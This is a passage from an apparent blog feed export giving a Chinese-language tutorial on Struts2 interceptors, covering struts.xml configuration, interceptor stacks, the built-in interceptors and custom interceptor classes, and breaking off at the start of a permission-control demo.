class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.devMode"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"helloworld"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"msg"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.action.MsgAction"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span>&gt;</span>/non_formTags.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="/2020/05/01/Struts2基础篇之标签/6.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/categories/Java/Struts2/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2基础篇之Interceptor（拦截器）</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Struts2%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B9%8BInterceptor%EF%BC%88%E6%8B%A6%E6%88%AA%E5%99%A8%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Struts2基础篇之Interceptor（拦截器）/</id>
    <published>2020-04-30T16:00:03.000Z</published>
    <updated>2020-08-15T06:40:31.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>本笔记直接参考或引自如下链接文章：</p><p><a href="http://c.biancheng.net/struts2/" target="_blank" rel="noopener">http://c.biancheng.net/struts2/</a></p><p><a href="https://www.w3cschool.cn/struts_2/" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/</a></p><h2 id="0x01-Interceptor简介"><a href="#0x01-Interceptor简介" class="headerlink" title="0x01 Interceptor简介"></a>0x01 Interceptor简介</h2><p>Interceptor即拦截器。</p><p>在 Struts2 框架中，拦截器是其重要的组成部分，Struts2 的很多功能（数据校验、对象类型转换、文件上传等）都是构建在拦截器之上的。</p><p>通常情况下，开发者通过 Struts2 内建的拦截器可以完成大部分的操作，只有在内建拦截器不能满足需求时，才会自己扩展。可以这么说，Struts2 框架的简单易用，与拦截器的作用是分不开的。</p><p>拦截器（Interceptor）是 Struts2 框架的核心组成部分，它类似于 Servlet 中的过滤器，是一种可以在请求之前或之后执行的 Struts2 的组件，也可以将其理解为动态拦截 Action 调用的对象。</p><p>在早期的 MVC 框架中，通常会将一些通用的操作（如类型转换、数据校验、解析上传的文件等）强制写在控制器中，而这些常用操作又不是所有的请求都需要实现的，这就导致了框架的灵活性不足、可扩展性低等问题。</p><p>在 Struts2 框架中，这些通用的核心功能都放到了拦截器中实现，而不是集中放在核心控制器中实现。</p><p>由于框架中各个功能对应的拦截器是分开定义的，每个拦截器都可以完成单个功能，并且可以自由选择、灵活组合，而需要哪些拦截器时，只要在 struts.xml 配置文件中指定即可，所以 Struts2 框架的使用十分灵活。同时，由于在 Struts2 框架中支持自定义拦截器，所以其扩展性十分强大。</p><p>当多个拦截器组合在一起时就形成了拦截器链（Interceptor Chain）或拦截器栈（Interceptor Stack）。</p><p>拦截器链就是指对应各个功能的拦截器按照一定的顺序排列在一起形成的链，而拦截器链组成的集合就是拦截器栈。当有适配连接器栈的访问请求进来时，这些拦截器就会按照之前定义的顺序被调用。</p><p>在通常情况下，拦截器都是以代理方式调用的，它在一个 Action 执行前后进行拦截，围绕着 Action 和 Result 的执行而执行，其工作方式如图下所示。</p><p>从图下中可以看出，Struts2 拦截器的实现原理与 Servlet 过滤器的实现原理类似，它以链式执行，对真正要执行的方法（execute()）进行拦截。</p><p><img src="/2020/05/01/Struts2基础篇之Interceptor（拦截器）/4.png" alt=""></p><p>在执行 Action 的 execute() 方法之前会执行一次拦截，在 Action 和 Result 执行之后，拦截器会再次执行（与先前的调用顺序相反）。在此链式执行的过程中，每一个拦截器都可以直接返回，从而终止余下的拦截器、Action 及 Result 的执行。</p><h2 id="0x02-Interceptor的配置和使用"><a href="#0x02-Interceptor的配置和使用" class="headerlink" title="0x02 Interceptor的配置和使用"></a>0x02 Interceptor的配置和使用</h2><h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><p>要使用拦截器，首先要对它进行配置。拦截器的配置是在 struts.xml 文件中完成的，它通常以 <code>&lt;interceptor&gt;</code> 标签开头，以 <code>&lt;/interceptor&gt;</code> 标签结束。定义拦截器的语法格式如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"interceptorName"</span> <span class="attr">class</span>=<span class="string">"interceptorClass"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"paramName"</span>&gt;</span>paramValue<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">interceptor</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述语法格式中，<code>&lt;interceptor&gt;</code> 元素的 name 属性用于指定拦截器的名称，class 属性用于指定拦截器的实现类。有时，在定义拦截器时需要传入参数，这时需要使用 <code>&lt;param&gt;</code> 标签，其中 name 属性用于指定参数的名称，paramValue 表示参数的值。</p><h3 id="拦截器栈"><a href="#拦截器栈" class="headerlink" title="拦截器栈"></a>拦截器栈</h3><p>在实际的项目开发中，经常需要在 Action 执行之前执行多个拦截动作，如登录日志记录、权限管理等。</p><p>为了方便代码管理和程序的执行，开发者通常会将这些拦截器组成一个拦截器栈，在使用时，可以将栈内的多个拦截器当成一个整体引用。当拦截器栈被附加到一个 Action 上时，在执行 Action 之前必须先执行拦截器栈中的每一个拦截器。</p><p>定义拦截器栈使用 <code>&lt;interceptors&gt;</code> 元素和 <code>&lt;interceptor-stack&gt;</code> 子元素，当配置多个拦截器时，需要使用 <code>&lt;interceptor-ref&gt;</code> 元素指定多个拦截器，配置语法如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"interceptorStackName"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"interceptorName"</span>/&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述语法中，interceptorStackName 值表示配置的拦截器栈的名称；interceptorName 值表示拦截器的名称。除此之外，在一个拦截器栈中还可以包含另一个拦截器栈，示例代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"default"</span> <span class="attr">namespace</span>=<span class="string">"/"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--声明拦截器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"interceptor1"</span> <span class="attr">class</span>=<span class="string">"interceptorClass"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"interceptor2"</span> <span class="attr">class</span>=<span class="string">"interceptorClass"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--定义一个拦截器栈myStack，该拦截器栈中包含两个拦截器和一个拦截器栈--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"myStack"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"defaultStack"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"interceptor1"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"interceptor2"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，定义的拦截器栈的名称是 myStack，在 myStack 栈中，除了引用了两个自定义的拦截器 interceptor1 和 interceptor2 以外，还引用了一个内置拦截器栈 defaultStack，这个拦截器是必须要引入的。</p><h3 id="默认拦截器"><a href="#默认拦截器" class="headerlink" title="默认拦截器"></a>默认拦截器</h3><p>如果想对一个包下的 Action 使用相同的拦截器，则需要为该包中的每个 Action 都重复指定同一个拦截器，这样写显然过于繁琐。为了解决此问题，Struts2 中支持使用默认拦截器，它可以对其指定的包中的所有 Action 都起到拦截作用。</p><p>一旦为某一个包指定了默认拦截器，并且该包中的 Action 未显示指定拦截器，则会使用默认拦截器。反之，若此包中的 Action 显示的指定了某个拦截器，则该默认拦截器将会被屏蔽。此时，如果还想使用默认拦截器，则需要用户手动配置该默认拦截器的引用。</p><p>配置默认拦截器需要使用 <code>&lt;default-interceptor-ref&gt;</code> 元素，此元素为 <code>&lt;package&gt;</code> 元素的子元素。其语法格式如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">"拦截器（栈）的名称"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>在上述语法格式中，name 属性的值必须是已经存在的拦截器或拦截器栈的名称。下面用该语法格式配置一个默认拦截器，示例代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"default"</span> <span class="attr">namespace</span>=<span class="string">"/"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--声明拦截器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"interceptor1"</span> <span class="attr">class</span>=<span class="string">"interceptorClass"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"interceptor2"</span> <span class="attr">class</span>=<span class="string">"interceptorClass"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--定义一个拦截器栈myStack，该拦截器栈中包含两个拦截器和一个拦截器栈--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"myStack"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"defaultStack"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"interceptor1"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"interceptor2"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置包下的默认拦截器，既可以是拦截器，也可以是拦截器栈--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">"myStack"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.LoginAction"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"input"</span>&gt;</span>/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，指定了包下面的默认拦截器为一个拦截器栈，该拦截器栈将会作用于包下所有的 Action。</p><p>注意：每一个包下只能定义一个默认拦截器，如果需要多个拦截器作为默认拦截器，则可以将这些拦截器定义为一个拦截器栈，再将这个拦截器栈作为默认拦截器即可。</p><h2 id="0x03-内建拦截器"><a href="#0x03-内建拦截器" class="headerlink" title="0x03 内建拦截器"></a>0x03 内建拦截器</h2><p>Struts2 框架中内置了许多拦截器，这些拦截器以 name-class 对的形式配置在 struts-default.xml 文件中，其中，name 是拦截器的名称，也就是引用的名字；class 指定了该拦截器所对应的实现。</p><p>只要自定义的包继承了 Struts2 的 struts-default 包，就可以使用包中定义的内建拦截器，否则需要自行定义拦截器。</p><h3 id="内建拦截器的介绍"><a href="#内建拦截器的介绍" class="headerlink" title="内建拦截器的介绍"></a>内建拦截器的介绍</h3><p>在 struts-default.xml 中，每一个拦截器都具有不同的意义，如下表：</p><table><thead><tr><th>名  称</th><th>说  明</th></tr></thead><tbody><tr><td>alias</td><td>在不同请求之间将请求参数在不同名称间转换，请求内容不变</td></tr><tr><td>autowiring</td><td>用于实现 Action 的自动装配</td></tr><tr><td>chain</td><td>让前一个 Action 的属性可以被后一个 Action 访问，现在和 chain 类型的 result() 结合使用</td></tr><tr><td>conversionError</td><td>将错误从 ActionContext 中添加到 Action 的属性字段中</td></tr><tr><td>cookies</td><td>使用配置的 Name 和 Value 指定 Cookies</td></tr><tr><td>cookieProvider</td><td>该类是一个 Cookie 工具，方便开发者向客户端写 Cookie</td></tr><tr><td>clearSession</td><td>用于清除一个 HttpSession 实例</td></tr><tr><td>createSession</td><td>自动创建 HttpSession，用于为需要使用 HttpSession 的拦截器服务</td></tr><tr><td>debugging</td><td>提供不同的调试用的页面展现内部的数据状况</td></tr><tr><td>execAndWait</td><td>在后台执行 Action，同时将用户带到一个中间的等待页面</td></tr><tr><td>exception</td><td>将异常定位到一个画面</td></tr><tr><td>fileUpload</td><td>提供文件上传功能</td></tr><tr><td>il8n</td><td>记录用户选择的 locale</td></tr><tr><td>logger</td><td>输出 Action 的名称</td></tr><tr><td>model-driven</td><td>如果一个类实现了 Model Driven，将 get Model 得到的结果放在 Value Slack 中</td></tr><tr><td>scoped-model-driven</td><td>如果一个 Action 实现了 ScopedModelDriven，则这个拦截器会从相应的 Scope 中取 出 model 调用 Action 的 setModel 方法，将其放入 Action 内部</td></tr><tr><td>params</td><td>将请求中的参数设置到 Action 中</td></tr><tr><td>actionMappingParams</td><td>用于负责在 Action 配置中传递参数</td></tr><tr><td>prepare</td><td>如果 Action 实现了 Preparable，则该拦截器调用 Action 类的 prepare 方法</td></tr><tr><td>staticParams</td><td>将 struts.xml 文件中 <action>标签的参数内容设置到对应的 Action 中</action></td></tr><tr><td>scope</td><td>将 Action 状态存入 session 和 application 范围</td></tr><tr><td>servletConfig</td><td>提供访问 HttpServletRequest 和 HttpServletResponse 方法，以 Map 方式访问</td></tr><tr><td>timer</td><td>输岀 Action 执行的时间</td></tr><tr><td>token</td><td>通过 Token 避免双击</td></tr><tr><td>tokenSession</td><td>和 Token Interceptor 一样，不过双击时把请求的数据存储在 Session 中</td></tr><tr><td>validation</td><td>使用 action-validation.xml 文件中定义的内容校验提交的数据</td></tr><tr><td>workflow</td><td>调用 Action 的 validate 方法，一旦有错谋返回，则重新定位到 INPUT 画面</td></tr><tr><td>store</td><td>存储或者访问实现 ValidalionAware 接口的 Action 类出现的消息、错误和字段错误等</td></tr><tr><td>checkbox</td><td>添加了 checkbox 自动处理代码，将没有选中的 checkbox 的内容设定为 false，而 html 在默认情况下不提交没有选中的 checkbox</td></tr><tr><td>datetime</td><td>日期拦截器</td></tr><tr><td>profiling</td><td>通过参数激活 profile</td></tr><tr><td>roles</td><td>确定用户是否具有 JAAS 指定的 Role，否则不予执行</td></tr><tr><td>annotationWorkflow</td><td>利用注解代替 XML 配置，使用 annotationWorkflow 拦截器可以使用注解，执行流程为 before-execute-feforeResult-after</td></tr><tr><td>multiselect</td><td>检测是否有像 <select> 标签一样被选中的多个值，然后添加一个空参数</select></td></tr><tr><td>deprecation</td><td>当日志级别设置为调试模式（debug）并且没有特殊参数时，在 devMode 模式中，会检查应用程序使用过时或未知的常量，并且显示警告</td></tr></tbody></table><p>Struts2 框架除了提供这些有用的拦截器以外，还定义了一些拦截器栈，在开发 Web 应用时，可以直接引用这些拦截器栈，而无须自定义拦截器。</p><p>注意：随着 Struts2 版本的发展，内建拦截器的数量也在相应地增多，不同版本的 Struts2 拦截器的数量有一些差异，此版本的 Struts2 内建拦截器共有 35 个。这些内建拦截器读者不需要记忆，只需要了解即可。</p><h3 id="内建拦截器的配置"><a href="#内建拦截器的配置" class="headerlink" title="内建拦截器的配置"></a>内建拦截器的配置</h3><p>在 struts-core-2.3.24.jar 包中的根目录下找到 struts-default.xml 文件，打开后找到 <code>&lt;interceptors&gt;</code> 元素下的内建拦截器和拦截器栈，其部分代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"struts-default"</span> <span class="attr">abstract</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--系统内建拦截器部分，上一部分介绍的内容--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"alias"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">"com.opensymphony.xwork2.interceptor.AliasInterceptor"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"autowiring"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">"com.opensymphony.xwork2.spring.interceptor.ActionAutowiringInterceptor"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"chain"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">"com.opensymphony.xwork2.interceptor.ChainingInterceptor"</span>/&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">&lt;!-- 定义Basic stack拦截器栈 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"basicStack"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--引用系统定义的exception拦截器--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"exception"</span>/&gt;</span></span><br><span class="line">            ...</span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">&lt;!-- 定义Sample model -driven stack --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"modelDrivenStack"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--引用系统定义的modelDriven拦截器--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"modelDriven"</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--引用系统定义的basicStack拦截器栈--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"basicStack"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">&lt;!--定义defaultStack拦截器栈--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"defaultStack"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"exception"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"alias"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"il8n"</span>/&gt;</span></span><br><span class="line">            ...</span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"validation"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"excludeMethods"</span>&gt;</span>input,back,cancel,browse<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-ref</span>&gt;</span></span><br><span class="line">            ...</span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--将defaulrStack拦截器栈配置为系统默认拦截器栈--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">"defaultStack"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--默认action类是ActionSupport--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-class-ref</span> <span class="attr">class</span>=<span class="string">"com.opensymphony.xwork2.ActionSupport"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述内建拦截器的配置代码中，defaultStack 拦截器组合了多个拦截器，这些拦截器可以满足大部分 Web 应用程序的需求。使用时，只要在 struts.xml 定义包的过程中继承 struts-default 包，那么 defaultStack 拦截器栈就是默认拦截器的引用。</p><p>由于本节篇幅有限，这里没有列出所有的内建拦截器和拦截器栈，读者需要时可以自行查阅 struts-default.xml 文件。</p><h2 id="0x04-自定义拦截器"><a href="#0x04-自定义拦截器" class="headerlink" title="0x04 自定义拦截器"></a>0x04 自定义拦截器</h2><p>在实际的项目开发中，虽然 Struts2 的内建拦截器可以完成大部分的拦截任务，但是，一些与系统逻辑相关的通用功能（如权限的控制和用户登录控制等），则需要通过自定义拦截器实现。</p><h3 id="实现Interceptor接口类"><a href="#实现Interceptor接口类" class="headerlink" title="实现Interceptor接口类"></a>实现Interceptor接口类</h3><p>在 Struts2 框架中，通常开发人员所编写的自定义拦截器类都会直接或间接地实现 com.opensymphony.xwork2.interceptor.Interceptor 接口。Interceptor 接口中的主要代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Interceptor</span> <span class="keyword">extends</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">String <span class="title">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，该接口共提供了以下三个方法。</p><ul><li><strong>void init()</strong>：该方法在拦截器被创建后会立即被调用，它在拦截器的生命周期内只被调用一次。可以在该方法中对相关资源进行必要的初始化。</li><li><strong>void destroy()</strong>：该方法与 init() 方法相对应，在拦截器实例被销毁之前，将调用该方法释放和拦截器相关的资源，它在拦截器的生命周期内，也只被调用一次。</li><li><strong>String intercept（ActionInvocation invocation）throws Exception</strong>：该方法是拦截器的核心方法，用于添加真正执行拦截工作的代码，实现具体的拦截操作，它返回一个字符串作为逻辑视图，系统根据返回的字符串跳转到对应的视图资源。每拦截一个动作请求，该方法就会被调用一次。该方法的 ActionInvocation 参数包含了被拦截的 Action 的引用，可以通过该参数的 invoke() 方法，将控制权转给下一个拦截器或者转给 Action 的 execute() 方法。</li></ul><h3 id="继承AbstractIntercepter抽象拦截器类"><a href="#继承AbstractIntercepter抽象拦截器类" class="headerlink" title="继承AbstractIntercepter抽象拦截器类"></a>继承AbstractIntercepter抽象拦截器类</h3><p>除了实现 Interceptor 接口可以自定义拦截器以外，在实际开发过程中，更常用的一种方式是继承抽象拦截器类 AbstractIntercepter。</p><p>AbstractIntercepter 类实现了 Interceptor 接口，并且提供了 init() 方法和 destroy() 方法的空实现。使用时，可以直接继承该抽象类，而不用实现那些不必要的方法。AbstractInterceptor 类中定义的方法如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInterceptor</span> <span class="keyword">implements</span> <span class="title">Interceptor</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">intercept</span> <span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，AbstractInterceptor 类已经实现了 Interceptor 接口的所有方法，一般情况下，只需继承 AbstractInterceptor 类，实现 interceptor() 方法就可以创建自定义拦截器。</p><p>需要注意的是，只有当自定义的拦截器需要打开系统资源时，才需要覆盖 AbstractInterceptor 类的 init() 方法和 destroy() 方法。与实现 Interceptor 接口相比，继承 AbstractInterceptor 类的方法更为简单。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>自定义拦截器实现权限控制实例。</p><p>新建一个st2test项目。</p><p>配置web.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 